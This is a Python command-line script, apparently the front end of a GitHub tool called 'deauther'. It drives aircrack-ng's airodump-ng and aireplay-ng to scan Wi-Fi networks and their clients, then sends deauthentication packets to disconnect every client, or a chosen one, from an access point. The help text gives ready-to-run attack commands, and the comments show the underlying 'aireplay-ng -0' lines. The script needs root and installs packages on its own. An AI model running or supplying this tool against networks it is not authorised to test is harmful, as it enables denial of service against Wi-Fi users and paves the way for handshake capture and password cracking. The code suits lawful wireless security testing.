#! /usr/bin/python3
import sys
import os

from lib.Argument import Argument

from airodump_ng.airodump import scan_n
from airodump_ng.airodump import scan_ap

from aireplay_ng.aireplay import deauth_all
from aireplay_ng.aireplay import deauth_client

from utils.list_aps import list_aps
from utils.list_clients import list_clients

parser = Argument()
args = sys.argv
parser.parse_args(args)


def check_root():
    if os.geteuid() != 0:
        print("Error: Run this tool as sudo user")
        exit()


check_root()


def check_airmon_ng():
    if os.system("airmon-ng") != 0:
        return False


if(check_airmon_ng() == False):
    print("")
    print("Installing required packages...")
    print("")
    os.system("sudo apt-get update -y")
    os.system("sudo apt-get install aircrack-ng -y")

mode, interface, channel, access_point, client, number, time, list_info = None, None, None, None, None, None, None, None

if ('--help' in args or '-h' in args) and len(args) == 2:
    print('Usage: sudo deauther.py [options]')
    print("")
    print('Options:')
    print("")
    print('  networks\t\t\t\tShow available network interfaces')
    print("")
    print('  -h, --help\t\t\t\tShow this help message and exit')
    print('  --mode=<mode>\t\t\t\tSpecify the mode to use')
    print('  --interface=<interface>\t\tSpecify the interface to use')
    print('  --time=<time>\t\t\t\tSpecify the time to scan')
    print('  --channel=<channel>\t\t\tSpecify the channel to use')
    print('  --access-point=<access-point>\t\tSpecify the MAC address of the access point')
    print('  --client=<client>\t\t\tSpecify the MAC address of the client')
    print('  --number=<number>\t\t\tSpecify the number of deauth packets to send')
    print("")
    print('Modes:')
    print("")
    print('  scan_wns\t\t\t\tScan for Wi-Fi networks')
    print('  list_aps\t\t\t\tList available Wi-Fi networks')
    print('  scan_ap\t\t\t\tScan for clients connected to a Wi-Fi network')
    print('  list_clients\t\t\t\tList clients connected to a Wi-Fi network')
    print('  deauth_all\t\t\t\tDeauthenticate all clients connected to a Wi-Fi network')
    print('  deauth_client\t\t\t\tDeauthenticate a specific client from a Wi-Fi network')
    print("")
    print('Usage:')
    print("")
    print('  sudo deauther --mode=scan_wns --interface=wlan0 --time=120')
    print('  sudo deauther --mode=list_aps')
    print('  sudo deauther --mode=scan_ap --interface=wlan0 --channel=6 --access-point=FF:FF:FF:FF:FF:FF --time=120')
    print('  sudo deauther --mode=list_clients')
    print('  sudo deauther --mode=deauth_all --interface=wlan0 --access-point=FF:FF:FF:FF:FF:FF --number=10')
    print('  sudo deauther --mode=deauth_client --interface=wlan0 --access-point=FF:FF:FF:FF:FF:FF --client=FF:FF:FF:FF:FF:FF --number=10')
    exit()

if len(args) == 1:
    print('Error: No arguments specified, use --help for more information')
    exit()

if args[1] == '--mode':
    print('Error: --mode not specified, use --help for more information')
    exit()

if '--mode' in parser.option:
    mode = parser.optionValues['--mode']

    # airodump-ng wlan0 >> scan_n.csv
    if mode == 'scan_wns':
        if '--interface' in parser.option:
            interface = parser.optionValues['--interface']
            if '--time' in parser.option:
                ttime = int(parser.optionValues['--time'])
                scan_n(interface, ttime)
            else:
                print('Error: --time not specified, use --help for more information')
        else:
            print('Error: --interface not specified, use --help for more information')

    # result of airodump-ng wlan0
    if mode == 'list_aps':
        list_aps()

    # airodump-ng wlan0 --channel 6 --bssid FF:FF:FF:FF:FF:FF >> scan_ap.csv
    if mode == 'scan_ap':
        if '--interface' in parser.option:
            interface = parser.optionValues['--interface']
            if '--time' in parser.option:
                ttime = int(parser.optionValues['--time'])
                if '--channel' in parser.option:
                    channel = parser.optionValues['--channel']
                    if '--access-point' in parser.option:
                        access_point = parser.optionValues['--access-point']
                        scan_ap(interface, ttime, channel, access_point)
                    else:
                        print(
                            'Error: --access-point not specified, use --help for more information')
                else:
                    print(
                        'Error: --channel not specified, use --help for more information')
            else:
                print('Error: --time not specified, use --help for more information')
        else:
            print('Error: --interface not specified, use --help for more information')

    if mode == 'list_clients':
        list_clients()

    # aireplay-ng -0 <number> -a <access point> <interface>
    if mode == 'deauth_all':
        if '--interface' in parser.option:
            interface = parser.optionValues['--interface']
            if '--access-point' in parser.option:
                access_point = parser.optionValues['--access-point']
                if '--number' in parser.option:
                    number = parser.optionValues['--number']
                    deauth_all(interface, access_point, number)
                else:
                    print(
                        'Error: --number not specified, use --help for more information')
            else:
                print(
                    'Error: --access-point not specified, use --help for more information')
        else:
            print('Error: --interface not specified, use --help for more information')

    # aireplay-ng -0 <number> -a <access point> -c <client> <interface>
    if mode == 'deauth_client':
        if '--interface' in parser.option:
            interface = parser.optionValues['--interface']
            if '--access-point' in parser.option:
                access_point = parser.optionValues['--access-point']
                if '--client' in parser.option:
                    client = parser.optionValues['--client']
                    if '--number' in parser.option:
                        number = parser.optionValues['--number']
                        deauth_client(interface, access_point, client, number)
                    else:
                        print(
                            'Error: --number not specified, use --help for more information')
                else:
                    print(
                        'Error: --client not specified, use --help for more information')
            else:
                print(
                    'Error: --access-point not specified, use --help for more information')
        else:
            print('Error: --interface not specified, use --help for more information')

if 'networks' in args:
    print("")
    print("Available network interfaces")
    print("")
    os.system("iwconfig")

if 'author' in args:
    print("")
    print("Author: Ezhil Shanmugham")
    print("GitHub: https://github.com/ezhil56x/deauther")
    print("")
